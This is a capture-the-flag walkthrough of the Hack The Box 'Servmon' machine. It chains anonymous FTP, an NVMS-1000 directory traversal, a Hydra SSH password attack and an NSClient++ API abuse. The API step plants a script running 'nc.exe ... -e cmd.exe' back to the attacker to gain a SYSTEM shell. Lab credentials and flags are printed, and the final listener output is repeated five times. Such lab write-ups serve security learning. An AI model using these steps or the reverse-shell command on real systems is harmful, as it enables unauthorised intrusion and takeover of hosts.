---
title: HTB Servmon Walkthrough
image:
  path: "/assets/images/servmon/servmon.jpeg"
  alt: HTB  SERVMON
---

## Box Summary

After the port scan, I found some interesting open ports, like `21/tcp (FTP)`, `80/tcp (HTTP)` and `8443/tcp (alt-HTTPS)`. Anonymous FTP login is allowed and through FTP I found in the folder of Nathan a txt-file with the message that there is a passwords.txt file placed on his Desktop. Then, I checked the  HTTP port and it seems that the NVMS-1000 software has a Path Traversal vulnerability.

User

Through the Path Traversal vulnerability, I was able to read the passwords.txt file from the Desktop of Nathan and establish an SSH connection with the user account of Nadine and grab the user flag.

Root

I checked the `8443/tcp` port and found that the software `NSClient++` is running on this box. After checking the version of NSClient++ I found that there is a known vulnerability for this particular version. Through the API I was able to put a revshell.bat in the scripts folder and execute this file. The reverse shell was established with Local System privileges.

## Reconnaissance
# Nmap Port scan 
```bash
nmap -sC -sV -oA servmon-nmap.txt 10.10.10.184

Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-11 15:14 EDT                                                                                                                                                                                            
Nmap scan report for 10.10.10.184                                                                                                                                                                                                                          
Host is up (0.063s latency).                                                                                                                                                                                                                               
Not shown: 991 closed ports                                                                                                                                                                                                                                
PORT     STATE SERVICE       VERSION                                                                                                                                                                                                                       
21/tcp   open  ftp           Microsoft ftpd                                                                                                                                                                                                                
| ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                                                                                                                                                                     
|_01-18-20  12:05PM       <DIR>          Users                                                                                                                                                                                                             
| ftp-syst:                                                                                                                                                                                                                                                
|_  SYST: Windows_NT                                                                                                                                                                                                                                       
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)                                                                                                                                                                                        
| ssh-hostkey:                                                                                                                                                                                                                                             
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)                                                                                                                                                                                             
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)                                                                                                                                                                                            
|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)                                                                                                                                                                                          
80/tcp   open  http                                                                                                                                                                                                                                        
| fingerprint-strings:                                                                                                                                                                                                                                     
|   GetRequest, HTTPOptions, RTSPRequest:                                                                                                                                                                                                                  
|     HTTP/1.1 200 OK                                                                                                                                                                                                                                      
|     Content-type: text/html                                                                                                                                                                                                                              
|     Content-Length: 340                                                                                                                                                                                                                                  
|     Connection: close                                                                                                                                                                                                                                    
|     AuthInfo:                                                                                                                                                                                                                                            
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">                                                                                                                            
|     <html xmlns="http://www.w3.org/1999/xhtml">                                                                                                                                                                                                          
|     <head>                                                                                                                                                                                                                                               
|     <title></title>                                                                                                                                                                                                                                      
|     <script type="text/javascript">                                                                                                                                                                                                                      
|     window.location.href = "Pages/login.htm";                                                                                                                                                                                                            
|     </script>                                                                                                                                                                                                                                            
|     </head>                                                                                                                                                                                                                                              
|     <body>                                                                                                                                                                                                                                               
|     </body>                                                                                                                                                                                                                                              
|     </html>                                                                                                                                                                                                                                              
|   NULL:                                                                                                                                                                                                                                                  
|     HTTP/1.1 408 Request Timeout                                                                                                                                                                                                                         
|     Content-type: text/html                                                                                                                                                                                                                              
|     Content-Length: 0                                                                                                                                                                                                                                    
|     Connection: close                                                                                                                                                                                                                                    
|_    AuthInfo:                                                                                                                                                                                                                                            
|_http-title: Site doesn't have a title (text/html).                                                                                                                                                                                                       
135/tcp  open  msrpc         Microsoft Windows RPC                                                                                                                                                                                                         
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                                                                                                                                 
445/tcp  open  microsoft-ds?                                                                                                                                                                                                                               
5666/tcp open  tcpwrapped                                                                                                                                                                                                                                  
6699/tcp open  napster?                                                                                                                                                                                                                                    
8443/tcp open  ssl/https-alt                                                                                                                                                                                                                               
| fingerprint-strings:                                                                                                                                                                                                                                     
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions:                                                                                                                                                                                               
|     HTTP/1.1 404                                                                                                                                                                                                                                         
|     Content-Length: 18                                                                                                                                                                                                                                   
|     Document not found                                                                                                                                                                                                                                   
|   GetRequest:                                                                                                                                                                                                                                            
|     HTTP/1.1 302                                                                                                                                                                                                                                         
|     Content-Length: 0                                                                                                                                                                                                                                    
|     Location: /index.html
|     workers
|_    jobs
| http-title: NSClient++
|_Requested resource was /index.html

Host script results:
|_clock-skew: 2m29s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-04-11T19:19:20
|_  start_date: N/A


```

There are some interesting ports open:

* `21` FTP
* `22` SSH
*  `80` HTTP
*   `8443` HTTPS

# FTP Anonymous Login
Anonymous access for FTP is allowed, let’s check that first and let’s directly login as `anonymous` with the default password `anonymous`.

```bash
~ftp 10.10.10.184
Connected to 10.10.10.184.
220 Microsoft FTP Service
Name (10.10.10.184:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp>
```
Poking around i find 2 users folders:

```bash
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:05PM       <DIR>          Users
226 Transfer complete.
ftp> cd users
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:06PM       <DIR>          Nadine
01-18-20  12:08PM       <DIR>          Nathan
226 Transfer complete.
```
I’ll grab all of the files there with ` wget -r ftp://anonymous:@10.10.10.184`

```bash
root@kali# find ftp/ -type f
ftp/Users/Nadine/Confidential.txt
ftp/Users/Nathan/Notes to do.txt
```
Confdential.txt has a note from Nadine to Nathan:

```
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

```

Notes to do.txt has a to do list:

```
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint

```

	# Port 80 HTTP 
	
	
	The next port in the enumeration phase is the HTTP port.The root redirects me to /Pages/login.htm, which is a login form for a NVMS-1000:
	
	
![nvms login page](/assets/images/servmon/nvms.png)

## Directory Traversal

searchsploit shows a directory traversal vulnerability in this application:

```bash

searchsploit "nvms 1000"
---------------------------------------------- ----------------------------------------
 Exploit Title                                |  Path
                                              | (/usr/share/exploitdb/)
---------------------------------------------- ----------------------------------------
NVMS 1000 - Directory Traversal               | exploits/hardware/webapps/47774.txt
---------------------------------------------- ----------------------------------------
Shellcodes: No Result
```
I checked this with Burpsuite and I found that this NVMS-1000 is vulnerable for directory traversal attack. I tried to read the /windows/win.ini, every time when the GET is failing I add a extra /../.

![burplfi](/assets/images/servmon/burp.png)

# Shell as Nadine

I know that there is on the desktop of Nathan a file called passwords.txt. As the NVMS-1000 has a Path Traversal vulnerability I could get that file and grab the passwords.

![burplfi](/assets/images/servmon/SSHpasswd.png)

I have now a list of passwords. I placed all of this passwords in a file called `passwords.txt`.

```
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```
i  created another file for users   nadine and nathan and launched `Hydra` for ssh and i got a match for `nadine` using this password : `L1k3B1gBut7s@W0rk`

```bash
~$ ssh Nadine@10.10.10.184
Microsoft Windows &#91;Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>cd Desktop

nadine@SERVMON C:\Users\Nadine\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 728C-D22C

 Directory of C:\Users\Nadine\Desktop

08/04/2020  22:28    <DIR>          .
08/04/2020  22:28    <DIR>          ..
15/04/2020  20:51                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)  27,418,095,616 bytes free

nadine@SERVMON C:\Users\Nadine\Desktop>type user.txt
7f26c77e1ccd17cede33c1b950c26e4e

nadine@SERVMON C:\Users\Nadine\Desktop>

```

# Privesc
## Enumeration 

From nmap output the only port we haven't checked is port `8443/tcp` When I visit this web page through the URL `https://10.10.10.184:8443 `I landed on the Sign In page of NSClient++. I tried to log in with the passwords I already know, but none of them are working. They are all resulting in a 403 Your not allowed notification.

I have already an active SSH session with the user account Nadine. Let’s try to find out which version of NSClient++ this box is running and I need to find the password. On the Documentation webpage from NSClient++ (https://docs.nsclient.org/). I found how I can grab the web administrator password.

```bash
nadine@SERVMON C:\Users\Nadine>powershell                                                                                                                                                                                                  
Windows PowerShell                                                                                                                                                                                                                         
Copyright (C) Microsoft Corporation. All rights reserved.                                                                                                                                                                                  
                                                                                                                                                                                                                                           
Try the new cross-platform PowerShell https://aka.ms/pscore6                                                                                                                                                                               
                                                                                                                                                                                                                                           
PS C:\Users\Nadine> cd 'C:\Program Files\NSClient++\'                                                                                                                                                                                      
PS C:\Program Files\NSClient++> .\nscp.exe web password --display
Current password: ew2x6SsGTxjRwXOT

```
So, the password is `ew2x6SsGTxjRwXOT`. With the command below I can check the current installed version of NSClient++.

```bash
PS C:\Program Files\NSClient++> .\nscp.exe --version
NSClient++, Version: 0.5.2.35 2018-01-28, Platform: x64

```

I know that this box is running NSClient++, I know the password and the version of this software. This has to be the way to root this box. Through searchsploit, I checked if there is a known vulnerability for this version of NSClient++ and it seems the case.

```bash
searchsploit nsclient++

NSClient++ 0.5.2.35 - Privilege Escalation           | exploits/windows/local/46802.txt

```
## Explotation

I choose the API way to root this box. I checked the API documentation of NSClient++ for the commands. I started by removing the curl alias in Powershell because it refers to the `Invoke-WebRequest` cmdlet in Powershell. 

```bash
PS C:\Program Files\NSClient++> Remove-Item alias:curl

```

First, I checked if I can call the API throuh the SSH session of Nadine. And it worked.

```bash
PS C:\Users\Nadine> curl -k -u admin https://localhost:8443/api/v1                                                   │
Enter host password for user 'admin':                                                                                │
{"info_url":"https://localhost:8443/api/v1/info","logs_url":"https://localhost:8443/api/v1/logs","modules_url":"https│
://localhost:8443/api/v1/modules","queries_url":"https://localhost:8443/api/v1/queries","scripts_url":"https://localh│
ost:8443/api/v1/scripts"}

```
As `CheckExternalScripts` and `Scheduler` are enabled already, I only have to place the script in the `C:\Program Files\NSClient++\Scripts` directory through the API and run this script. I invoked the command below and placed a reverse shell script, named revshell.bat. Of course, I placed the `nc.exe` file in the `C:\Temp ` directory.

```bash
curl -s -k -u admin -X PUT https://127.0.0.1:8443/api/v1/scripts/ext/scripts/revshell.bat --data-binary "C:\Temp\nc.exe 10.10.14.42 4444 -e cmd.exe"

```

With this command I call the script.

```bash
curl -s -k -u admin https://127.0.0.1:8443/api/v1/queries/revshell/commands/execute?time=3m

```

The reverse shell is established and I can now grab the root flag.

```bash
~$ nc -lvp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.184.
Ncat: Connection from 10.10.10.184:50184.
Microsoft Windows &#91;Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Program Files\NSClient++>whoami
whoami
nt authority\system

C:\Program Files\NSClient++>type "C:\Users\Administrator\Desktop\root.txt"
type "C:\Users\Administrator\Desktop\root.txt"
d3d0930a47b35c8ae6ff3689411bf7ad

C:\Program Files\NSClient++>
~$ nc -lvp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.184.
Ncat: Connection from 10.10.10.184:50184.
Microsoft Windows &#91;Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Program Files\NSClient++>whoami
whoami
nt authority\system

C:\Program Files\NSClient++>type "C:\Users\Administrator\Desktop\root.txt"
type "C:\Users\Administrator\Desktop\root.txt"
d3d0930a47b35c8ae6ff3689411bf7ad

C:\Program Files\NSClient++>
~$ nc -lvp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.184.
Ncat: Connection from 10.10.10.184:50184.
Microsoft Windows &#91;Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Program Files\NSClient++>whoami
whoami
nt authority\system

C:\Program Files\NSClient++>type "C:\Users\Administrator\Desktop\root.txt"
type "C:\Users\Administrator\Desktop\root.txt"
d3d0930a47b35c8ae6ff3689411bf7ad

C:\Program Files\NSClient++>
~$ nc -lvp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.184.
Ncat: Connection from 10.10.10.184:50184.
Microsoft Windows &#91;Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Program Files\NSClient++>whoami
whoami
nt authority\system

C:\Program Files\NSClient++>type "C:\Users\Administrator\Desktop\root.txt"
type "C:\Users\Administrator\Desktop\root.txt"
d3d0930a47b35c8ae6ff3689411bf7ad

C:\Program Files\NSClient++>
~$ nc -lvp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.184.
Ncat: Connection from 10.10.10.184:50184.
Microsoft Windows &#91;Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Program Files\NSClient++>whoami
whoami
nt authority\system

C:\Program Files\NSClient++>type "C:\Users\Administrator\Desktop\root.txt"
type "C:\Users\Administrator\Desktop\root.txt"
d3d0930a47b35c8ae6ff3689411bf7ad

C:\Program Files\NSClient++>

```
